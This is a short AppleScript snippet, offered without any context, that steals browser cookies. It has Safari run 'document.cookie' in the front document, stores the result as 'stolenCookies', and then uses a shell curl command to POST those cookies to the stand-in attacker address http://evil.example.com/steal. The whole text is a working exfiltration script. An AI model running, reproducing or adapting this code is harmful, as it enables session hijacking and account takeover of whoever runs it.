tell application "Safari"
	set stolenCookies to do JavaScript "document.cookie" in document 1
end tell

do shell script "curl -X POST -d 'cookies=" & stolenCookies & "' http://evil.example.com/steal"
